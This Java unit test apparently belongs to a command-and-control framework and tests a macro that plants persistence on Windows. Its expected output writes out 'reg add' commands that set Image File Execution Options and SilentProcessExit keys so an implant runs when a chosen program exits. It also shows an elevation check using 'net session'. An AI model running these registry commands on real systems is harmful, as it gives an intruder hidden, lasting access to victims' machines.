package c2.session.macro.persistence;

import static org.junit.jupiter.api.Assertions.*;

import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import c2.Commands;
import c2.Constants;
import c2.WindowsConstants;
import c2.session.CommandLoader;
import c2.session.IOManager;
import c2.session.log.IOLogger;
import c2.session.macro.MacroOutcome;
import util.Time;
import util.test.ClientServerTest;

class RegistrySilentExitTest {

	
	IOManager io;
	int sessionId;

	@BeforeEach
	void setUp() throws Exception {
		Properties prop = ClientServerTest.getDefaultSystemTestProperties();
					CommandLoader cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
		io = new IOManager(new IOLogger(Paths.get(prop.getProperty(Constants.HUBLOGGINGPATH))), cl);

		sessionId = io.addSession("noone", "testHost", "protocol");
	}
	
	private class ClientStartCmdEmulator implements Runnable {

		private IOManager session;
		private int sessionId;
		private boolean alive = true;
		private boolean simElevatedPrivs = true;

		public ClientStartCmdEmulator(int sessionid, IOManager session) {
			this.session = session;
			this.sessionId = sessionid;
		}

		public void kill() {
			alive = false;
		}
		
		public void deactivateElevatedPrivs() {
			simElevatedPrivs = false;
		}
		
		public void run() {
			while (alive) {
				String command = session.pollCommand(sessionId);
				if (command == null) {
					// continue
					Time.sleepWrapped(10);
				}else if(command.startsWith("reg add") && simElevatedPrivs) {
					session.sendIO(sessionId, WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG);
				}else if(command.contains("net session 2>&1")) {
					if(simElevatedPrivs) {
						session.sendIO(sessionId, "There are no entries in the list.");
					}else {
						session.sendIO(sessionId, "Access is denied.");
					}
				} else {
					if (command.equalsIgnoreCase(Commands.CLIENT_GET_EXE_CMD)) {
						session.sendIO(sessionId, "fakestart.exe");
					}
				}
			}
		}

	}
	
	@Test
	void testRecognizesCommand() {
		RegistrySilentExit macro = new RegistrySilentExit();
		assertTrue(macro.isCommandMatch(RegistrySilentExit.COMMAND + " calc.exe"));
		assertFalse(macro.isCommandMatch("barf calc.exe"));
	}
	
	@Test 
	void testInvalidInput() {
		RegistrySilentExit macro = new RegistrySilentExit();
		macro.initialize(io, null);
		MacroOutcome outcome = macro.processCmd(RegistrySilentExit.COMMAND + " calc.exe BARF", sessionId, null);
		assertTrue(outcome.hasErrors());
		assertEquals("Error: " + RegistrySilentExit.HELP, outcome.getOutput().get(0));
		
		outcome = macro.processCmd(RegistrySilentExit.COMMAND, sessionId, null);
		assertTrue(outcome.hasErrors());
		assertEquals("Error: " + RegistrySilentExit.HELP, outcome.getOutput().get(0));
	}
	
	@Test
	void testNominal() {
		ExecutorService exec = Executors.newFixedThreadPool(2);
		ClientStartCmdEmulator em = new ClientStartCmdEmulator(sessionId, io);
		exec.submit(em);
		
		RegistrySilentExit macro = new RegistrySilentExit();
		macro.initialize(io, null);
		MacroOutcome outcome = macro.processCmd(RegistrySilentExit.COMMAND + " calc.exe", sessionId, null);
		assertFalse(outcome.hasErrors());
		
		assertEquals("Sent Command: 'get_daemon_start_cmd'", outcome.getOutput().get(0));
		assertEquals("Received response: 'fakestart.exe"
				+ System.lineSeparator()+ "'", outcome.getOutput().get(1));
		assertEquals("Sent Command: 'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v GlobalFlag /t REG_DWORD /d 512'", outcome.getOutput().get(2));
		assertEquals("Received response: 'The operation completed successfully."
				+ System.lineSeparator()+ "'", outcome.getOutput().get(3));
		assertEquals("Sent Command: 'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\calc.exe\" /v ReportingMode /t REG_DWORD /d 1'", outcome.getOutput().get(4));
		assertEquals("Received response: 'The operation completed successfully."
				+ System.lineSeparator()+ "'", outcome.getOutput().get(5));
		assertEquals("Sent Command: 'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\calc.exe\" /v MonitorProcess /d \"fakestart.exe\"'", outcome.getOutput().get(6));
		assertEquals("Received response: 'The operation completed successfully."
				+ System.lineSeparator() + "'", outcome.getOutput().get(7));
		assertEquals("Macro Executor: 'Success!'", outcome.getOutput().get(8));
		
		em.kill();
	}
	
	@Test 
	void testNotElevatedPrivileges() {
		ExecutorService exec = Executors.newFixedThreadPool(2);
		ClientStartCmdEmulator em = new ClientStartCmdEmulator(sessionId, io);
		em.deactivateElevatedPrivs();
		exec.submit(em);
		
		RegistrySilentExit macro = new RegistrySilentExit();
		macro.initialize(io, null);
		MacroOutcome outcome = macro.processCmd(RegistrySilentExit.COMMAND + " calc.exe", sessionId, null);
		assertTrue(outcome.hasErrors());
		assertEquals("Error: Failure: Must be running from an elevated session to write to HKLM", outcome.getOutput().get(0));
		em.kill();
	}

}
